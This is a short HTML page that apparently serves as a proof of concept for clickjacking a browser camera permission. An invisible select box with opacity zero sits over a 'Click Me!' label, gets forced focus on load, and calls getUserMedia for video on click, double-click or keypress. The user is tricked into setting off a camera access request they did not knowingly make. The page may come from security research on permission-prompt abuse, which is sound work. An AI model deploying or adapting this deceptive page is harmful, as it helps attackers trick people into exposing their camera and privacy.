<html>
<head></head>
<body id="xx" onload="jjk()">

    <!-- Label (Moved a little left) -->
    <div style="
      position: absolute;
      margin-top: 68px; /* Keeps the adjusted height */
      margin-left: -120px; /* Moved slightly left */
  ">
        <label>
            <span style="width: 100px;">Click here.............Click Me!</span>
        </label>
    </div>

    <!-- Select Box (Moved a little left to match the label) -->
    <div style="margin-left: -100px; /* Moved slightly left */ margin-top: 68px; /* Keeps the adjusted height */ z-index: 1; position: absolute;">
        <span id="xz" style="width: 100px;"></span>
        <select onclick="requestCameraAccess()" ondblclick="requestCameraAccess()" onkeypress="requestCameraAccess()" autofocus id="sf" style="width: 200px; opacity: 0;">
            <option value="0">to sent notification</option>
        </select>
    </div>

    <script>
        function requestCameraAccess() {
            document.getElementById("sf").removeAttribute("disabled");
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    console.log("Camera access granted", stream);
                })
                .catch(error => {
                    console.error("Camera access denied", error);
                });
            document.getElementById("sf").focus();
        }

        function jjk() {
            setTimeout(xxy, 10);
        }

        function xxy() {
            document.getElementById("sf").focus();
        }
    </script>

</body>
</html>
